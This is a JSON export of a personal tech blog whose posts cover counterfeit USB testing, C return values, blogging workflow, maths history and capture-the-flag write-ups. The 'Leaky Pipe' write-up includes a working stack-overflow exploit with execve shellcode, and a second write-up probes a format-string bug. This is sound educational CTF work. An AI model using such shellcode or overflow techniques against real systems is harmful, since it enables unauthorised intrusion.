drive\nf3fix\nCorrects the flash drive\u0026rsquo;s capacity to the actual size\nf3write\nWrites large files to the flash drive\nf3read\nChecks the written files integrity\nFirst run of f3probe\n$ sudo f3probe --destructive --time-ops /dev/sdb F3 probe 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. WARNING: Probing normally takes from a few seconds to 15 minutes, but it can take longer. Please be patient. Bad news: The device `/dev/sdd\u0026#39; is a counterfeit of type limbo You can \u0026#34;fix\u0026#34; this device using the following command: f3fix --last-sec=2147483647 /dev/sdd Device geometry: *Usable* size: 1.00 TB (2147483648 blocks) Announced size: 1.91 TB (4096000000 blocks) Module: 2.00 TB (2^41 Bytes) Approximate cache size: 1.00 MB (2048 blocks), need-reset=no Physical block size: 512.00 Byte (2^9 Bytes) Probe time: 6.01s Operation: total time / count = avg time Read: 187.5ms / 4213 = 44us Write: 5.82s / 22706 = 256us Reset: 0us / 1 = 0us The tool says that our flash drive is only 1TB, however, this was still too good to be true to me so I reran the command multiple time and the following was the output.\n$ sudo f3probe --destructive --time-ops /dev/sdb F3 probe 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. WARNING: Probing normally takes from a few seconds to 15 minutes, but it can take longer. Please be patient. Bad news: The device `/dev/sdd\u0026#39; is a counterfeit of type limbo You can \u0026#34;fix\u0026#34; this device using the following command: f3fix --last-sec=101781503 /dev/sdd Device geometry: *Usable* size: 48.53 GB (101781504 blocks) Announced size: 1.91 TB (4096000000 blocks) Module: 2.00 TB (2^41 Bytes) Approximate cache size: 255.00 MB (522240 blocks), need-reset=no Physical block size: 512.00 Byte (2^9 Bytes) Probe time: 6\u0026#39;11\u0026#34; Operation: total time / count = avg time Read: 16.48s / 1049168 = 15us Write: 5\u0026#39;54\u0026#34; / 5749135 = 61us Reset: 0us / 2 = 0us This makes more sense, I ran the fixing command it mentions in the output above, this corrects the capacity to the actual.\nf3fix --last-sec=101781503 /dev/sdd I was still worried of the integrity of these 48 GBs so I ran f3write on the mount point.\n$ f3write /media/hegz/SUSB/ F3 write 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. Free space: 1.91 TB Creating file 1.h2w ... OK! Creating file 2.h2w ... OK! Creating file 3.h2w ... OK! Creating file 4.h2w ... OK! Creating file 5.h2w ... OK! Creating file 6.h2w ... OK! Creating file 7.h2w ... OK! Creating file 8.h2w ... OK! Creating file 9.h2w ... OK! Creating file 10.h2w ... OK! Creating file 11.h2w ... OK! Creating file 12.h2w ... OK! Creating file 13.h2w ... OK! Creating file 14.h2w ... OK! Creating file 15.h2w ... OK! Creating file 16.h2w ... OK! Creating file 17.h2w ... OK! Creating file 18.h2w ... OK! Creating file 19.h2w ... OK! Creating file 20.h2w ... OK! Creating file 21.h2w ... OK! Creating file 22.h2w ... OK! Creating file 23.h2w ... OK! Creating file 24.h2w ... OK! Creating file 25.h2w ... OK! Creating file 26.h2w ... OK! Creating file 27.h2w ... OK! Creating file 28.h2w ... OK! Creating file 29.h2w ... OK! Creating file 30.h2w ... OK! Creating file 31.h2w ... OK! Creating file 32.h2w ... OK! Creating file 33.h2w ... OK! Creating file 34.h2w ... OK! Creating file 35.h2w ... OK! Creating file 36.h2w ... OK! Creating file 37.h2w ... OK! Creating file 38.h2w ... OK! Creating file 39.h2w ... OK! Creating file 40.h2w ... OK! Creating file 41.h2w ... OK! Creating file 42.h2w ... OK! Creating file 43.h2w ... OK! Creating file 44.h2w ... OK! Creating file 45.h2w ... OK! Creating file 46.h2w ... OK! Creating file 47.h2w ... OK! Creating file 48.h2w ... OK! Creating file 49.h2w ... Write failure: Input/output error WARNING: The write error above may be due to your memory card overheating under constant, maximum write rate. You can test this hypothesis touching your memory card. If it is hot, you can try f3write again, once your card has cooled down, using parameter --max-write-rate=2048 to limit the maximum write rate to 2MB/s, or another suitable rate. Creating file 50.h2w ... 2.46% -- 8.64 MB/s -- 84:20:56f3write: libflow.h:89: get_rem_chunk_size: Assertion `fw-\u0026gt;blocks_per_delay \u0026gt; fw-\u0026gt;processed_blocks\u0026#39; failed. Aborted (core dumped) This took around 3 hours to finish, I then ran f3read.\n$ f3read /media/hegz/SUSB/ F3 read 8.0 Copyright (C) 2010 Digirati Internet LTDA. This is free software; see the source for copying conditions. SECTORS ok/corrupted/changed/overwritten Validating file 1.h2w ... 2097152/ 0/ 0/ 0 Validating file 2.h2w ... 2097152/ 0/ 0/ 0 Validating file 3.h2w ... 2097152/ 0/ 0/ 0 Validating file 4.h2w ... 2097152/ 0/ 0/ 0 Validating file 5.h2w ... 2097152/ 0/ 0/ 0 Validating file 6.h2w ... 2097152/ 0/ 0/ 0 Validating file 7.h2w ... 2097152/ 0/ 0/ 0 Validating file 8.h2w ... 2097152/ 0/ 0/ 0 Validating file 9.h2w ... 2097152/ 0/ 0/ 0 Validating file 10.h2w ... 2097152/ 0/ 0/ 0 Validating file 11.h2w ... 2097152/ 0/ 0/ 0 Validating file 12.h2w ... 2097152/ 0/ 0/ 0 Validating file 13.h2w ... 2097152/ 0/ 0/ 0 Validating file 14.h2w ... 2097152/ 0/ 0/ 0 Validating file 15.h2w ... 2097152/ 0/ 0/ 0 Validating file 16.h2w ... 2097152/ 0/ 0/ 0 Validating file 17.h2w ... 2097152/ 0/ 0/ 0 Validating file 18.h2w ... 2097152/ 0/ 0/ 0 Validating file 19.h2w ... 2097152/ 0/ 0/ 0 Validating file 20.h2w ... 2097152/ 0/ 0/ 0 Validating file 21.h2w ... 2097152/ 0/ 0/ 0 Validating file 22.h2w ... 2097152/ 0/ 0/ 0 Validating file 23.h2w ... 2097152/ 0/ 0/ 0 Validating file 24.h2w ... 2097152/ 0/ 0/ 0 Validating file 25.h2w ... 2097152/ 0/ 0/ 0 Validating file 26.h2w ... 2097152/ 0/ 0/ 0 Validating file 27.h2w ... 2097152/ 0/ 0/ 0 Validating file 28.h2w ... 2097152/ 0/ 0/ 0 Validating file 29.h2w ... 2097152/ 0/ 0/ 0 Validating file 30.h2w ... 2097152/ 0/ 0/ 0 Validating file 31.h2w ... 2097152/ 0/ 0/ 0 Validating file 32.h2w ... 2097152/ 0/ 0/ 0 Validating file 33.h2w ... 2097152/ 0/ 0/ 0 Validating file 34.h2w ... 2097152/ 0/ 0/ 0 Validating file 35.h2w ... 2097152/ 0/ 0/ 0 Validating file 36.h2w ... 2097152/ 0/ 0/ 0 Validating file 37.h2w ... 2097152/ 0/ 0/ 0 Validating file 38.h2w ... 2097152/ 0/ 0/ 0 Validating file 39.h2w ... 2097152/ 0/ 0/ 0 Validating file 40.h2w ... 2097152/ 0/ 0/ 0 Validating file 41.h2w ... 2097152/ 0/ 0/ 0 Validating file 42.h2w ... 2097152/ 0/ 0/ 0 Validating file 43.h2w ... 2097152/ 0/ 0/ 0 Validating file 44.h2w ... 2097152/ 0/ 0/ 0 Validating file 45.h2w ... 2097152/ 0/ 0/ 0 Validating file 46.h2w ... 2097152/ 0/ 0/ 0 Validating file 47.h2w ... 2097152/ 0/ 0/ 0 Validating file 48.h2w ... 2097152/ 0/ 0/ 0 Validating file 49.h2w ... 114938/ 0/ 0/ 0 - NOT fully read due to \u0026#34;Input/output error\u0026#34; Validating file 50.h2w ... 0/ 0/ 0/ 0 Data OK: 48.05 GB (100778234 sectors) Data LOST: 0.00 Byte (0 sectors) Corrupted: 0.00 Byte (0 sectors) Slightly changed: 0.00 Byte (0 sectors) Overwritten: 0.00 Byte (0 sectors) WARNING: Not all data was read due to I/O error(s) Average reading speed: 31.29 MB/s This confirms that the actual usable size of my USB is 48GB.\n","description":"I found a listing for a 2TB usb flash drive on AliExpress for less than $3 I bought It and after 24 days, I recieved my order and started analyzing it, little did I know a surprise was waiting for me.","id":14,"section":"posts","tags":null,"title":"Fighting counterfeit USB Flash Drives","uri":"https://hegzploit.github.io/posts/counterfeit-usbs/"},{"content":"A lot of people are driven by emotions, logical thinking doesn\u0026rsquo;t always result in agreement, in fact, most people are more influenced by emotions than logic, does that make logical thinking uselss.\nIt depends on a lot of factors, you shouldn\u0026rsquo;t boldly assume that logic works with everyone, a good strategy to get your message through might be analyzing the recipient, before deciding on your means of communication.\nThat\u0026rsquo;s a useful skill If you have to deal with multitude of different people, life is all about balancing things and overdoing is never wise.\n","description":"eh","id":15,"section":"posts","tags":["thoughts"],"title":"Emotion and Logic","uri":"https://hegzploit.github.io/posts/emotion-vs-logic/"},{"content":"I was having a chit-chat with a friend discussing some C language shenanigans\nwhen he sent me a code snippet, he wanted me fix the code and get it to work in\n4 different ways.\nHere is the snippet:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y); int main(void){ int x = 10, y = 50; printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y){ int sum = x + y; int mul = x * y; } There are two main takeaways from the above snippet:\nThe calc function is never called in main. Even if we called it in main, the sum and mul variables are locals to the\nscope of calc. The obvious solution to me was to just make these variables globals then we can\njust call calc in main and we\u0026rsquo;re done, but he wanted me to do it in 4\ndifferent ways, that was clearly an exercise of passing values around in C.\nUsing Global Variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; int sum, mul; void calc (int x, int y); int main(void){ int x = 10, y = 50; calc(x, y); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y){ sum = x + y; mul = x * y; } Output\nsum=60 mult=500\nThis is pretty simple, by making the sum and mul variables global, we just\nexpand their scope to the whole program.\nUsing Pointers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y, int *sum, int *mul); int main(void){ int x = 10, y = 50; int sum, mul; calc(x, y, \u0026amp;sum , \u0026amp;mul); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); } void calc (int x, int y, int *sum, int *mul){ *sum = x + y; *mul = x * y; } In this solution we declared these variables in the main function and\npassed them by pointers (i.e. we passed a reference to their location in\nmemory), by doing this we can freely modify a variable from another scope since\nwe directly access the variable\u0026rsquo;s location in memorey.\ni.e. we dereference a memory address and modify the value that the address is\npointing to.\nBonus: Passing by Reference (C++) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; void calc (int x, int y, int \u0026amp;sum, int \u0026amp;mul); int main(void){ int x = 10, y = 50; int sum, mul; calc(x, y, sum , mul); printf(\u0026#34;sum=%d \u0026#34;, sum); printf(\u0026#34;mult=%d\u0026#34;, mul); return 0; } void calc (int x, int y, int \u0026amp;sum, int \u0026amp;mul){ sum = x + y; mul = x * y; } C++ allows us to directly pass the address of sum and mul without using\npointers, we just pass them by reference.\nThat\u0026rsquo;s why I think people should be careful of using the terms \u0026ldquo;pass-by-pointer\u0026rdquo;\nand \u0026ldquo;pass-by-reference\u0026rdquo; interchangeably as these are two different things.\nUsing Arrays 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; int calc (int x, int y, int *result); int main(void){ int x = 10, y = 50; int result[2]; calc(x, y, result); printf(\u0026#34;sum=%d \u0026#34;, result[0]); printf(\u0026#34;mult=%d\u0026#34;, result[1]); } int calc (int x, int y, int *result){ int sum = x + y; int mul = x * y; result[0] = sum; result[1] = mul; } Passing values with arrays are useful when our values have the same type, It is\nvery similar to passing by pointer/reference since we actually pass the address\nof the array to the calc function, It\u0026rsquo;s values is then modified using the\narray notation my_array[index] = value which is really equivalent to\n*(my_array + index) = value.\nUsing Structs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; struct Result{ int sum, mul; }; struct Result calc (int x, int y); void main(void){ int x = 10, y = 50; struct Result result = calc(x, y); printf(\u0026#34;sum=%d\u0026#34;, result.sum); printf(\u0026#34;mult=%d\u0026#34;, result.mul); } struct Result calc (int x, int y){ struct Result res; res.sum = x + y; res.mul = x * y; return res; } C structs are a decent way of passing multiple values around functions,\nespecially when these values are of different types, we can also get around\ntyping Struct Result a bunch of times by adding a typedef that introduces a new\ntype in our code, It makes our code a bit cleaner and easier to read.\nThis is the same code but with introducing the typedef.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; typedef struct Result{ int sum, mul; }; Result calc (int x, int y); int main(void){ int x = 10, y = 50; Result result = calc(x, y); printf(\u0026#34;sum=%d \u0026#34;, result.sum); printf(\u0026#34;mult=%d\u0026#34;, result.mul); } Result calc (int x, int y){ Result res; res.sum = x + y; res.mul = x * y; return res; } Note: All these solutions are ways to return multiple values from a function, unlike modern languages like python we can\u0026rsquo;t do this in C, another good solution is splitting the calc function two two spearate functions where each one of them will return It\u0026rsquo;s result, sometimes this can be better than the above approaches and It\u0026rsquo;s all depending on taste.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int sum (int x, int y); int mul (int x, int y); void main(void){ int x = 10, y = 50; printf(\u0026#34;sum=%d \u0026#34;, sum(x,y)); printf(\u0026#34;mult=%d\u0026#34;, mul(x,y)); } int sum (int x, int y){ int sum = x + y; return sum; } int mul (int x, int y){ int mul = x * y; return mul; } ","description":"I was having a chit-chat with a friend discussing some C language shenanigans when he sent me a code snippet, he wanted me fix the code and get it to work in 4 different ways.","id":16,"section":"posts","tags":null,"title":"Ways to return function values in C","uri":"https://hegzploit.github.io/posts/passing-values-in-c/"},{"content":"I started blogging at 2020 and was using Hugo as my go-to Static Site Generator, It was pretty fast and did the job well (Jekyll yes, I\u0026rsquo;m looking you).\nThe process went as follows:\nI had two repos, one for the blog config files and the markdown sources of my posts. I then build these files using hugo build into static HTML pages which I push to another repo that serves my blog through github pages.\nThe process went as follows:\nPull a fresh copy of my blog config repo Create a new .md file with my new blog post Commit the changes to my repo and push Build the repo to generate the static website Push the website to the gh pages serving repo This process was very boring and sometimes I\u0026rsquo;d forget to sync my repos across the different machines I use, eventaully I just used dropbox to store the blog config. and .md files but I still wasn\u0026rsquo;t satisfied with my setup.\nNew Blogging Workflow I was searching for any new SSG besides hugo until I found zola which is very similar to hugo except It\u0026rsquo;s more barebones which is something I liked (rust ftw!), I migrated my posts and started thinking about an easier alternative to my current workflow.\nCI/CD is just fancy make I\u0026rsquo;d always hear about this CI/CD jargon and I finally thought it\u0026rsquo;s time to give it a try, It was surprisingly easy too.\nIt\u0026rsquo;s like make but for the cloud ain\u0026rsquo;t it?\nI created my repo with the source code for my blog and some random yaml file which I copy-pasted from the internet and voila!\nNow I can just push any new .md file to the repo and It will automatically build and deploy for a gh pages branch for me.\nEndless possibilities It\u0026rsquo;s not just about deploying with a single push, I can even blog using my browser directly from the web.\nHackmd is a markdown editor for the browser which has github integration, so I can just write my blog there and Github will handle the rest.\nThe only downside to this workflow is how Hackmd uses imgur to host images, I wish there\u0026rsquo;d be an easier approach to have the images self-contained in the repo.\nUpdate 19/12/2022 I have switched from hackmd to https://github.dev, the integrated vscode gave me a more streamlined experience and I enjoyed my workflow even more.\nI have switched back to hugo since I found a really cool theme which had all of the features I wanted, I\u0026rsquo;m kinda lazy to write my own theme at this point so I keep hopping between different themes I like, let\u0026rsquo;s see for how long I will stick with the current theme.\n","description":"I started blogging at 2020 and was using Hugo as my go-to Static Site Generator, It was pretty fast and did the job well (Jekyll yes, I'm looking you).","id":17,"section":"posts","tags":null,"title":"My new blogging workflow","uri":"https://hegzploit.github.io/posts/new-ssg/"},{"content":"These are by far the best resources I have found and have actually tried since I started learning binary exploitation.\nDon\u0026rsquo;t waste your time choosing which is the best resource, just pick one and start digging in. They are all awesome!\nVideo Dr. Ali Hadi\u0026rsquo;s Offensive Software Exploitation | English - Arabic Nakerah Network\u0026rsquo;s BOF Playlist - Arabic (Windows) Hegzploit - Arabic LiveOverflow GynvaelEN Search for topics on ippsec.rocks The Cyber Mentor\u0026rsquo;s Playlist (Windows) - New Updated Video PinkDraconian\u0026rsquo;s Playlist John Hammond\u0026rsquo;s Playlist John Hammond\u0026rsquo;s PicoCTF2022 Binary Exploitation Walkthroughs CryptoCat Intro to BinEx Full Fledged Courses Pwn College Georgia Institute of Technology Course Guyintuxedo - Nightmare Practice Material Exploit Exercises picoCTF pwnable.tw pwnable.kr ROP Emporium ","description":"A curated list of top notch pwn resources.","id":18,"section":"posts","tags":null,"title":"Binary Exploitation Resources","uri":"https://hegzploit.github.io/posts/bof-resources/"},{"content":"In this series of blog posts, I will be discussing some of my favorite topics in math, It mostly falls under the domains of mathematical logic and computability theory.\nDiophantus of Alexandria Diophantus was a Greek mathematician that flourished around 250 AD, he is most famous for his book \u0026ldquo;Arithmetica\u0026rdquo; in which he had compiled 130 algebraic problems among thirteen books where most of their solutions were positive integers, and that\u0026rsquo;s why mathematicians call such algebraic equations as \u0026ldquo;Diophantine Equations\u0026rdquo;.\nIt is said that he wrote his book \u0026ldquo;Arithmetica\u0026rdquo; as a distraction from his son\u0026rsquo;s death, and it turned out to be one of the most brilliant books that discussed algebra and he was amongst the first to use symbolic representations for real-life problems, he was also the first to use powers of more than 2 and 3 which had no physical meaning unlike the square and the cube, his solutions also never involved zeroes or negative numbers.\nDiophantus had a brilliant way of solving problems involving multiple variables using only a single variable, he did it in such a way that he finds relations that represent the other variables in terms of the first variable.\nA Diophantine Problem For Example, In his first problem of the fourth book:\n\u0026ldquo;Divide a given number into two cubes such that the sum of their sides is a given number\u0026rdquo;.\nHe then provides two numbers:\nGiven Number: 370 Sum of Sides: 10 Normal Approach We can visualize the problem Geomterically as follows:\nLet\u0026rsquo;s solve it using second grade algebra!\nThe two sides ($x$ and $y$) add up to 10 and the sum of their cubes ($x^3$ and $y^3$) is 370.\n$$x + y = 10$$\n$$x^3 + y^3 = 370$$\n$$x = 10 - y$$\n$$(10 - y)^3 + y^3 = 370$$\n$$(1000 + 30y^2 - 300y - y^3) + y^3 = 370$$\n$$30y^2 - 300y + 630 = 0$$\n$$y^2 - 10y + 21 = 0$$\n$$(y - 7)(y - 3) = 0$$\n$$\\boxed{x = 7}\\ \\boxed{y = 3}$$\nI didn\u0026rsquo;t want to bother with a detailed explanation of the steps above (I hope all of those who are reading this know some basic algebra), here is how Diophantus solved such problems.\nDiophantus\u0026rsquo;s Approach He would first express the two variables $x$ and $y$ as two relations in terms of one variable so his $x$ will be $(5+x)$ and his $y$ will be $(5-x)$.\n$$(5 + x) + (5 - x) = 10$$\nThese indeed satisfy the first equation and will yield 10 upon adding them together, and for the second equation, he describes it as follows:\n$$(5 + x)^3 + (5 - x)^3 = 370$$\nIt will seem a bit odd and crazy at first, but once we start expanding these cubes, terms will start canceling out like crazy until we are left with:\n$$30x^2 + 250 = 370$$\nWhich will yield:\n$$x^2 = 4$$\nFinally we arrive at the same solution:\n$$x = 2$$\n$$(x + 5) = {\\bf 7}$$\n$$(x - 5) = {\\bf 3}$$\nhis problems may seem plain and simple at the first glance but they sometimes become very tough and hard to attack, a famous quote by the German mathematician Hermann Hankel regarding the diophantine problems, \u0026ldquo;Every question requires a quite special method, which often will not serve even for the most closely allied problems. It is on that account difficult for a modern mathematician even after studying 100 Diophantine solutions to solve the 101st problem\u0026rdquo;\nFermat\u0026rsquo;s Last Theorem Pierre de Fermat was a famous 17th-century French mathematician, he had a copy of Diophantus\u0026rsquo;s Arithmetica and had filled its margins extensively with notes.\nAt one of the problems that involved a solution in the form of $x^2\\ +\\ b^2\\ =\\ c^2$, Fermat wrote:\n\u0026ldquo;On the contrary, it is impossible to separate a cube into two cubes, a fourth power into two fourth powers, or generally any power above the second into two powers of the same degree. I have discovered a truly marvelous demonstration which this margin is too narrow to contain.”\nThis nonexistent proof became knows as “Fermat’s Last Theorem”, It was later solved by the British Number Theorist Andrew Wiles in 1993 after three and a half centuries, he then received the Abel Prize in 2016 for his solution.\n","description":"In this series of blog posts, I will be discussing some of my favorite topics in math, It mostly falls under the domains of mathematical logic and computability theory.","id":19,"section":"posts","tags":["math"],"title":"A Journey into Mathematical Logic: Diophantus of Alexandria","uri":"https://hegzploit.github.io/posts/diophantus/"},{"content":"In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag.\nyou can find the binary for this challenge here\nInitial Analysis We start by running the binary and checking it behavior.\n./leaky_pipe We have just fixed the plumbing systm, let\u0026#39;s hope there\u0026#39;s no leaks! \u0026gt;.\u0026gt; aaaaah shiiit wtf is dat address doin here... 0x7ffde7760410 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \u0026lt;--- our input Segmentation fault (core dumped) And as we see, we can already get a segfault by spamming some A\u0026rsquo;s in the input.\nOne intersting catch is that address in the output of the binary, we also note that it changes everytime we run the binary so the binary probably is a PIE (Position Independent Executable).\nLet\u0026rsquo;s run a checksec to make sure of our hypothesis.\ngef➤ checksec [+] checksec for \u0026#39;/vagrant/leaky_pipe/leaky_pipe\u0026#39; Canary : ✘ NX : ✘ PIE : ✓ Fortify : ✘ RelRO : Partial Seems like we have everything disabled except PIE just as predicted.\nReversing the binary Let\u0026rsquo;s load the binary in ghidra and check the generated decompilation, sometimes this can save a lot of time trying to understand a disassembly.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 undefined8 main(void) { basic_ostream *pbVar1; basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *this; ssize_t sVar2; undefined8 uVar3; undefined local_28 [32]; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout, \u0026#34;We have just fixed the plumbing systm, let\\\u0026#39;s hope there\\\u0026#39;s no leaks!\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout, \u0026#34;\u0026gt;.\u0026gt; aaaaah shiiit wtf is dat address doin here... \u0026#34;); this = (basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *) std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1,local_28); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; (this,std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sVar2 = read(0,local_28,0x40); if (sVar2 \u0026lt; 5) { pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,\u0026#34;no smol input plz\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); uVar3 = 0xffffffff; } else { uVar3 = 0; } return uVar3; } The binary is fairly simple to reverse, it\u0026rsquo;s written in C++ so the decompilation may seem overwhelming at the first glance but its actually quite simple!\nWe are intersted in the part at line 16 where it reads 0x40 bytes from STDIN to the buffer named local_28.\n1 sVar2 = read(0,local_28,0x40); On checking the variable local_28 we can see that it\u0026rsquo;s only 32 bytes long and we are trying to read 64 (0x40) bytes into it, and that\u0026rsquo;s why we got a segfault.\n1 undefined local_28 [32]; One more thing we notice on analyzing the decompilation is the address we saw at the output of the binary, here is the part we are intersted in.\n1 2 3 this = (basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *) std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1,local_28); Seems like it\u0026rsquo;s printing a pointer to the buffer local_28!\nThis is just too good to be true at this point, we have a leaked address of a buffer that we control.\nIf we recall our checksec result we saw that NX-bit was not set so this meaning we can execute arbitrary shellcode on the stack.\nLet\u0026rsquo;s fireup our editor and start creating the exploit using a 64-bit execve(*\u0026quot;/bin/sh/\u0026quot;) shellcode.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from pwn import * context.binary = \u0026#39;leaky_pipe\u0026#39; OFFSET = 40 if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#39;ctf.0xl4ugh.com\u0026#39;, 4141) else: io = process(\u0026#39;leaky_pipe\u0026#39;) # Extract the buffer address that is leaked so we can use it in our exploit print(io.recvuntil(\u0026#34;...\u0026#34;)) address = io.recvlineS().strip() address = int(address,0) # Shellcode from https://www.exploit-db.com/exploits/42179 # We start filling the buffer with our shellcode # and the remaining bytes are padded with A\u0026#39;s. payload = b\u0026#34;\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05\u0026#34; payload += (b\u0026#34;A\u0026#34;* (40 - len(payload))) # We then overwrite the return adderss with the leaked address # which is the start of our shellcode. payload += p64(address) io.sendline(payload) io.interactive() ","description":"In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag.","id":20,"section":"writeups","tags":["pwn"],"title":"Leaky Pipe - 0xL4ugh CTF","uri":"https://hegzploit.github.io/writeups/leaky-pipe/"},{"content":"It was the first ever pwn challenge I solve in a CTF and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It\u0026rsquo;s pretty awesome to look back and see how much did we grow).\nYou can check my video on format string vulnerabilies as a refresher for these types of attacks (It\u0026rsquo;s in arabic tho).\nYou can download the challenge\u0026rsquo;s bianry from my github here\nInitial Static Analysis We start by analyzing the bianry and checking the protections\n1 2 $ file trigger_happy trigger_happy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=de726633c6d3ec5839065e67784dcfdb3497b074, for GNU/Linux 3.2.0, not stripped 1 2 3 4 5 6 7 8 $ gdb trigger_happy gef➤ checksec [+] checksec for \u0026#39;/home/vagrant/ctf/0xl4ugh/trigger_happy\u0026#39; Canary : ✘ NX : ✘ PIE : ✘ Fortify : ✘ RelRO : Partial Seems like we are dealing with 32 bit not stripped ELF bianry.\nInitial Dynamic Analysis On running the binary, it\u0026rsquo;s gonna ask for input and then print it out for us.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? AAAABBBBCCCCDDDD I am glad you AAAABBBBCCCCDDDD We wish you luck! Seems suspecious, let\u0026rsquo;s try %x as input and see what do we get.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? %x %x %x I am glad you 200 f7f52540 80491d1 We wish you luck! Voila, seems like we found a format string vulnerable pivot which we can use to leak stack values or even write to pointers on the stack.\nWe can further confirm our assumptions by checking the disassembly of our binary for a printf() call with only one argument, but we are going to skip this step.\nOne more thing we are going to do is locating the index of the stack entry we control with the printf function, a simple way to do this is by placing an egg and following it with a couple of %x\u0026rsquo;s until we can see our egg in the leaked addresses and then we can get its index.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? AAAA %x %x %x %x %x %x %x %x I am glad you AAAA 200 f7fbb540 80491d1 41414141 20782520 25207825 78252078 20782520 We wish you luck! We can see the hex value for our egg (AAAA) at the 4th entry on the stack.\nMore Static Analysis I always love to start the analysis by listing the current function in the binary using gdb, and happily our binary isn\u0026rsquo;t stripped.\ngef➤ info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 printf@plt 0x08049040 fgets@plt 0x08049050 getegid@plt 0x08049060 puts@plt 0x08049070 system@plt 0x08049080 __libc_start_main@plt 0x08049090 setvbuf@plt 0x080490a0 setresgid@plt 0x080490b0 _start 0x080490f0 _dl_relocate_static_pie 0x08049100 __x86.get_pc_thunk.bx 0x08049110 deregister_tm_clones 0x08049150 register_tm_clones 0x08049190 __do_global_dtors_aux 0x080491c0 frame_dummy 0x080491c2 response 0x08049245 flaggy 0x08049270 main 0x080492eb __x86.get_pc_thunk.ax 0x080492f0 __libc_csu_init 0x08049350 __libc_csu_fini 0x08049351 __x86.get_pc_thunk.bp 0x08049358 _fini The only function which seems suspecious is \u0026ldquo;flaggy\u0026rdquo; which kinda sounds like \u0026ldquo;flag\u0026rdquo;?\nLet\u0026rsquo;s disassmble it.\n$ disas flaggy Dump of assembler code for function flaggy: 0x08049245 \u0026lt;+0\u0026gt;: push ebp 0x08049246 \u0026lt;+1\u0026gt;: mov ebp,esp 0x08049248 \u0026lt;+3\u0026gt;: push ebx 0x08049249 \u0026lt;+4\u0026gt;: sub esp,0x4 0x0804924c \u0026lt;+7\u0026gt;: call 0x80492eb \u0026lt;__x86.get_pc_thunk.ax\u0026gt; 0x08049251 \u0026lt;+12\u0026gt;: add eax,0x2daf 0x08049256 \u0026lt;+17\u0026gt;: sub esp,0xc 0x08049259 